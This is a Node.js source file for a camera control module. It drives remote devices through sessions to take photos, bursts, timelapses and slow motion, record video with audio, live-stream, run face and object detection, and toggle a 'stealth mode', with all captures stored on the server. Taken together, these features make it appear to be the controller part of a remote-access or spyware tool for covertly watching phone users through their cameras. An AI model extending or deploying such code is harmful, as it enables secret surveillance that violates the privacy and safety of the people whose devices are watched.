/**
 * Camera Module - Complete Camera Control System
 * Features: Front/Back Camera, Video Recording, Burst Mode, Night Mode, HDR, Zoom, Timelapse, Stealth Mode
 */

const EventEmitter = require('events');
const fs = require('fs-extra');
const path = require('path');
const crypto = require('crypto');
const sharp = require('sharp'); // Optional, for image processing
const config = require('../config');

class CameraModule extends EventEmitter {
    constructor(sessionManager) {
        super();
        this.sessionManager = sessionManager;
        this.activeSessions = new Map(); // sessionId -> camera state
        this.recordingSessions = new Map(); // sessionId -> recording state
        this.streamingSessions = new Map(); // sessionId -> streaming state
        this.capturedImages = new Map(); // sessionId -> captured images cache
        
        // Camera capabilities cache
        this.capabilities = new Map(); // sessionId -> camera capabilities
        
        // Image processing options
        this.imageOptions = {
            quality: 90,
            format: 'jpeg',
            maxWidth: 1920,
            maxHeight: 1080
        };
        
        // Initialize directories
        this.initDirectories();
    }
    
    initDirectories() {
        this.captureDir = path.join(__dirname, '../../captures');
        this.thumbDir = path.join(this.captureDir, 'thumbnails');
        fs.ensureDirSync(this.captureDir);
        fs.ensureDirSync(this.thumbDir);
    }
    
    // ==================== CAMERA CAPTURE ====================
    
    async capturePhoto(sessionId, cameraType = 'back', options = {}) {
        const session = this.sessionManager.getSession(sessionId);
        if (!session) {
            throw new Error('Session not found');
        }
        
        const commandId = crypto.randomBytes(8).toString('hex');
        const timestamp = Date.now();
        const filename = `photo_${sessionId}_${timestamp}.jpg`;
        const filePath = path.join(this.captureDir, filename);
        const thumbPath = path.join(this.thumbDir, `thumb_${filename}`);
        
        // Prepare capture options
        const captureOptions = {
            camera: cameraType,
            quality: options.quality || 90,
            resolution: options.resolution || '1920x1080',
            flash: options.flash || 'auto',
            focus: options.focus || 'auto',
            iso: options.iso || 'auto',
            whiteBalance: options.whiteBalance || 'auto',
            exposure: options.exposure || 0,
            timestamp: timestamp
        };
        
        // Send capture command to device
        try {
            const result = await this.sessionManager.executeCommand(sessionId, 'capture_photo', captureOptions, 30000);
            
            if (result && result.imageData) {
                // Save image data
                const imageBuffer = Buffer.from(result.imageData, 'base64');
                await fs.writeFile(filePath, imageBuffer);
                
                // Generate thumbnail
                const thumbnail = await this.generateThumbnail(imageBuffer);
                await fs.writeFile(thumbPath, thumbnail);
                
                // Cache image info
                const imageInfo = {
                    id: commandId,
                    filename: filename,
                    path: filePath,
                    thumbnail: thumbPath,
                    size: imageBuffer.length,
                    timestamp: timestamp,
                    cameraType: cameraType,
                    options: captureOptions,
                    metadata: result.metadata || {}
                };
                
                if (!this.capturedImages.has(sessionId)) {
                    this.capturedImages.set(sessionId, []);
                }
                this.capturedImages.get(sessionId).push(imageInfo);
                
                // Emit event
                this.emit('photo_captured', sessionId, imageInfo);
                
                return imageInfo;
            } else {
                throw new Error('No image data received');
            }
            
        } catch (error) {
            console.error(`Camera capture failed for session ${sessionId}:`, error);
            throw error;
        }
    }
    
    async captureBurst(sessionId, count = 5, interval = 500, cameraType = 'back') {
        const results = [];
        
        for (let i = 0; i < count; i++) {
            try {
                const photo = await this.capturePhoto(sessionId, cameraType, { burst: true, burstIndex: i });
                results.push(photo);
                
                if (i < count - 1) {
                    await this.sleep(interval);
                }
            } catch (error) {
                console.error(`Burst capture ${i + 1}/${count} failed:`, error);
                results.push({ error: error.message, index: i });
            }
        }
        
        this.emit('burst_captured', sessionId, results);
        
        return results;
    }
    
    // ==================== VIDEO RECORDING ====================
    
    async startRecording(sessionId, duration = 30, quality = 'high', cameraType = 'back', audio = true) {
        const session = this.sessionManager.getSession(sessionId);
        if (!session) {
            throw new Error('Session not found');
        }
        
        if (this.recordingSessions.has(sessionId)) {
            throw new Error('Already recording');
        }
        
        const recordingId = crypto.randomBytes(8).toString('hex');
        const timestamp = Date.now();
        const filename = `video_${sessionId}_${timestamp}.mp4`;
        const filePath = path.join(this.captureDir, filename);
        
        const recordingOptions = {
            duration: duration,
            quality: quality,
            camera: cameraType,
            audio: audio,
            resolution: quality === 'high' ? '1920x1080' : quality === 'medium' ? '1280x720' : '640x480',
            framerate: quality === 'high' ? 60 : 30,
            bitrate: quality === 'high' ? 5000000 : 2000000
        };
        
        try {
            // Send start recording command
            await this.sessionManager.executeCommand(sessionId, 'start_recording', recordingOptions, 10000);
            
            const recordingState = {
                id: recordingId,
                filename: filename,
                path: filePath,
                startTime: timestamp,
                duration: duration,
                options: recordingOptions,
                status: 'recording'
            };
            
            this.recordingSessions.set(sessionId, recordingState);
            this.emit('recording_started', sessionId, recordingState);
            
            // Auto-stop after duration
            if (duration > 0) {
                setTimeout(async () => {
                    if (this.recordingSessions.has(sessionId)) {
                        await this.stopRecording(sessionId);
                    }
                }, duration * 1000);
            }
            
            return recordingState;
            
        } catch (error) {
            console.error(`Failed to start recording for session ${sessionId}:`, error);
            throw error;
        }
    }
    
    async stopRecording(sessionId) {
        const recordingState = this.recordingSessions.get(sessionId);
        if (!recordingState) {
            throw new Error('No active recording');
        }
        
        try {
            // Send stop recording command
            const result = await this.sessionManager.executeCommand(sessionId, 'stop_recording', {}, 30000);
            
            if (result && result.videoData) {
                // Save video data
                const videoBuffer = Buffer.from(result.videoData, 'base64');
                await fs.writeFile(recordingState.path, videoBuffer);
                
                recordingState.status = 'completed';
                recordingState.endTime = Date.now();
                recordingState.size = videoBuffer.length;
                recordingState.durationActual = (recordingState.endTime - recordingState.startTime) / 1000;
                
                this.emit('recording_stopped', sessionId, recordingState);
                
                return recordingState;
            }
            
        } catch (error) {
            console.error(`Failed to stop recording for session ${sessionId}:`, error);
            recordingState.status = 'failed';
            recordingState.error = error.message;
            throw error;
            
        } finally {
            this.recordingSessions.delete(sessionId);
        }
    }
    
    // ==================== LIVE STREAMING ====================
    
    async startLiveStream(sessionId, streamUrl = null, quality = 'medium') {
        const session = this.sessionManager.getSession(sessionId);
        if (!session) {
            throw new Error('Session not found');
        }
        
        if (this.streamingSessions.has(sessionId)) {
            throw new Error('Already streaming');
        }
        
        const streamId = crypto.randomBytes(8).toString('hex');
        const timestamp = Date.now();
        
        const streamOptions = {
            url: streamUrl || `wss://${config.server.host}/stream/${streamId}`,
            quality: quality,
            resolution: quality === 'high' ? '1920x1080' : quality === 'medium' ? '1280x720' : '640x480',
            framerate: quality === 'high' ? 30 : 15
        };
        
        try {
            await this.sessionManager.executeCommand(sessionId, 'start_stream', streamOptions, 10000);
            
            const streamState = {
                id: streamId,
                url: streamOptions.url,
                startTime: timestamp,
                options: streamOptions,
                status: 'streaming',
                viewers: 0
            };
            
            this.streamingSessions.set(sessionId, streamState);
            this.emit('stream_started', sessionId, streamState);
            
            return streamState;
            
        } catch (error) {
            console.error(`Failed to start stream for session ${sessionId}:`, error);
            throw error;
        }
    }
    
    async stopLiveStream(sessionId) {
        const streamState = this.streamingSessions.get(sessionId);
        if (!streamState) {
            throw new Error('No active stream');
        }
        
        try {
            await this.sessionManager.executeCommand(sessionId, 'stop_stream', {}, 10000);
            
            streamState.status = 'stopped';
            streamState.endTime = Date.now();
            
            this.emit('stream_stopped', sessionId, streamState);
            
            return streamState;
            
        } catch (error) {
            console.error(`Failed to stop stream for session ${sessionId}:`, error);
            throw error;
            
        } finally {
            this.streamingSessions.delete(sessionId);
        }
    }
    
    // ==================== CAMERA SETTINGS ====================
    
    async setFlash(sessionId, mode) {
        const validModes = ['on', 'off', 'auto', 'torch'];
        if (!validModes.includes(mode)) {
            throw new Error(`Invalid flash mode: ${mode}. Valid: ${validModes.join(', ')}`);
        }
        
        return await this.sessionManager.executeCommand(sessionId, 'set_flash', { mode }, 10000);
    }
    
    async setFocus(sessionId, mode, point = null) {
        const validModes = ['auto', 'continuous', 'infinity', 'macro', 'fixed'];
        if (!validModes.includes(mode)) {
            throw new Error(`Invalid focus mode: ${mode}. Valid: ${validModes.join(', ')}`);
        }
        
        return await this.sessionManager.executeCommand(sessionId, 'set_focus', { mode, point }, 10000);
    }
    
    async setZoom(sessionId, level) {
        if (level < 1 || level > 10) {
            throw new Error('Zoom level must be between 1 and 10');
        }
        
        return await this.sessionManager.executeCommand(sessionId, 'set_zoom', { level }, 10000);
    }
    
    async setISO(sessionId, iso) {
        const validISO = ['auto', 100, 200, 400, 800, 1600, 3200];
        if (!validISO.includes(iso)) {
            throw new Error(`Invalid ISO: ${iso}. Valid: ${validISO.join(', ')}`);
        }
        
        return await this.sessionManager.executeCommand(sessionId, 'set_iso', { iso }, 10000);
    }
    
    async setWhiteBalance(sessionId, mode) {
        const validModes = ['auto', 'daylight', 'cloudy', 'tungsten', 'fluorescent', 'shade'];
        if (!validModes.includes(mode)) {
            throw new Error(`Invalid white balance mode: ${mode}. Valid: ${validModes.join(', ')}`);
        }
        
        return await this.sessionManager.executeCommand(sessionId, 'set_white_balance', { mode }, 10000);
    }
    
    async setExposure(sessionId, value) {
        if (value < -3 || value > 3) {
            throw new Error('Exposure compensation must be between -3 and +3');
        }
        
        return await this.sessionManager.executeCommand(sessionId, 'set_exposure', { value }, 10000);
    }
    
    async setResolution(sessionId, width, height) {
        return await this.sessionManager.executeCommand(sessionId, 'set_resolution', { width, height }, 10000);
    }
    
    async setNightMode(sessionId, enabled) {
        return await this.sessionManager.executeCommand(sessionId, 'set_night_mode', { enabled }, 10000);
    }
    
    async setHDR(sessionId, enabled) {
        return await this.sessionManager.executeCommand(sessionId, 'set_hdr', { enabled }, 10000);
    }
    
    async setStealthMode(sessionId, enabled) {
        return await this.sessionManager.executeCommand(sessionId, 'set_stealth_mode', { enabled }, 10000);
    }
    
    async switchCamera(sessionId) {
        return await this.sessionManager.executeCommand(sessionId, 'switch_camera', {}, 10000);
    }
    
    // ==================== CAMERA CAPABILITIES ====================
    
    async getCapabilities(sessionId) {
        if (this.capabilities.has(sessionId)) {
            return this.capabilities.get(sessionId);
        }
        
        try {
            const capabilities = await this.sessionManager.executeCommand(sessionId, 'get_camera_capabilities', {}, 15000);
            this.capabilities.set(sessionId, capabilities);
            return capabilities;
        } catch (error) {
            console.error(`Failed to get camera capabilities for session ${sessionId}:`, error);
            return null;
        }
    }
    
    // ==================== IMAGE PROCESSING ====================
    
    async generateThumbnail(imageBuffer, width = 320, height = 240) {
        try {
            // Use sharp if available, otherwise simple resize
            if (typeof sharp !== 'undefined') {
                return await sharp(imageBuffer)
                    .resize(width, height, { fit: 'cover' })
                    .jpeg({ quality: 70 })
                    .toBuffer();
            } else {
                // Simple thumbnail generation (just return original)
                return imageBuffer.slice(0, Math.min(imageBuffer.length, 50000));
            }
        } catch (error) {
            console.error('Thumbnail generation failed:', error);
            return imageBuffer;
        }
    }
    
    async applyFilter(imageBuffer, filter) {
        if (typeof sharp === 'undefined') {
            return imageBuffer;
        }
        
        try {
            let processed = sharp(imageBuffer);
            
            switch(filter) {
                case 'grayscale':
                    processed = processed.grayscale();
                    break;
                case 'sepia':
                    processed = processed.tint({ r: 112, g: 66, b: 20 });
                    break;
                case 'vintage':
                    processed = processed.modulate({ brightness: 0.9, saturation: 0.8 });
                    break;
                case 'vivid':
                    processed = processed.modulate({ saturation: 1.3, brightness: 1.1 });
                    break;
                case 'cool':
                    processed = processed.tint({ r: 100, g: 120, b: 200 });
                    break;
                case 'warm':
                    processed = processed.tint({ r: 220, g: 160, b: 100 });
                    break;
                default:
                    return imageBuffer;
            }
            
            return await processed.jpeg({ quality: 90 }).toBuffer();
        } catch (error) {
            console.error('Filter application failed:', error);
            return imageBuffer;
        }
    }
    
    // ==================== TIMELAPSE ====================
    
    async startTimelapse(sessionId, interval = 5000, duration = 3600000, cameraType = 'back') {
        const timelapseId = crypto.randomBytes(8).toString('hex');
        const startTime = Date.now();
        const endTime = startTime + duration;
        const images = [];
        
        const captureInterval = setInterval(async () => {
            if (Date.now() >= endTime) {
                clearInterval(captureInterval);
                this.emit('timelapse_completed', sessionId, { timelapseId, images });
                return;
            }
            
            try {
                const photo = await this.capturePhoto(sessionId, cameraType, { timelapse: true });
                images.push(photo);
                this.emit('timelapse_frame', sessionId, { timelapseId, frame: images.length, photo });
            } catch (error) {
                console.error('Timelapse capture failed:', error);
            }
        }, interval);
        
        return { timelapseId, interval, duration, startTime, endTime };
    }
    
    // ==================== SLOW MOTION ====================
    
    async startSlowMotion(sessionId, duration = 10, slowFactor = 4, cameraType = 'back') {
        const slowMoId = crypto.randomBytes(8).toString('hex');
        
        const options = {
            duration: duration,
            slowFactor: slowFactor,
            camera: cameraType,
            framerate: 120
        };
        
        try {
            const result = await this.sessionManager.executeCommand(sessionId, 'start_slow_motion', options, 30000);
            
            this.emit('slow_motion_started', sessionId, { slowMoId, options });
            
            return { slowMoId, options, result };
        } catch (error) {
            console.error('Slow motion failed:', error);
            throw error;
        }
    }
    
    // ==================== FACE DETECTION ====================
    
    async startFaceDetection(sessionId) {
        return await this.sessionManager.executeCommand(sessionId, 'start_face_detection', {}, 10000);
    }
    
    async stopFaceDetection(sessionId) {
        return await this.sessionManager.executeCommand(sessionId, 'stop_face_detection', {}, 10000);
    }
    
    // ==================== OBJECT DETECTION ====================
    
    async startObjectDetection(sessionId, objects = []) {
        return await this.sessionManager.executeCommand(sessionId, 'start_object_detection', { objects }, 10000);
    }
    
    async stopObjectDetection(sessionId) {
        return await this.sessionManager.executeCommand(sessionId, 'stop_object_detection', {}, 10000);
    }
    
    // ==================== IMAGE MANAGEMENT ====================
    
    async getCapturedImages(sessionId, limit = 50, offset = 0) {
        const images = this.capturedImages.get(sessionId) || [];
        return images.slice(offset, offset + limit);
    }
    
    async getImage(sessionId, imageId) {
        const images = this.capturedImages.get(sessionId) || [];
        return images.find(img => img.id === imageId);
    }
    
    async deleteImage(sessionId, imageId) {
        const images = this.capturedImages.get(sessionId);
        if (!images) return false;
        
        const index = images.findIndex(img => img.id === imageId);
        if (index !== -1) {
            const image = images[index];
            await fs.remove(image.path);
            await fs.remove(image.thumbnail);
            images.splice(index, 1);
            this.emit('image_deleted', sessionId, imageId);
            return true;
        }
        return false;
    }
    
    async clearImages(sessionId) {
        const images = this.capturedImages.get(sessionId);
        if (images) {
            for (const image of images) {
                await fs.remove(image.path);
                await fs.remove(image.thumbnail);
            }
            this.capturedImages.delete(sessionId);
            this.emit('images_cleared', sessionId);
            return true;
        }
        return false;
    }
    
    // ==================== UTILITIES ====================
    
    sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }
    
    // ==================== EVENT HANDLERS ====================
    
    onPhotoCaptured(callback) {
        this.on('photo_captured', callback);
    }
    
    onRecordingStarted(callback) {
        this.on('recording_started', callback);
    }
    
    onRecordingStopped(callback) {
        this.on('recording_stopped', callback);
    }
    
    onStreamStarted(callback) {
        this.on('stream_started', callback);
    }
    
    onStreamStopped(callback) {
        this.on('stream_stopped', callback);
    }
    
    // ==================== CLEANUP ====================
    
    cleanup() {
        // Clear all session data
        this.activeSessions.clear();
        this.recordingSessions.clear();
        this.streamingSessions.clear();
        this.capturedImages.clear();
        this.capabilities.clear();
        
        // Remove old capture files (older than 24 hours)
        const now = Date.now();
        const maxAge = 24 * 60 * 60 * 1000;
        
        const cleanDir = async (dir) => {
            const files = await fs.readdir(dir);
            for (const file of files) {
                const filePath = path.join(dir, file);
                const stats = await fs.stat(filePath);
                if (now - stats.mtimeMs > maxAge) {
                    await fs.remove(filePath);
                }
            }
        };
        
        cleanDir(this.captureDir).catch(console.error);
        cleanDir(this.thumbDir).catch(console.error);
    }
}

module.exports = CameraModule;
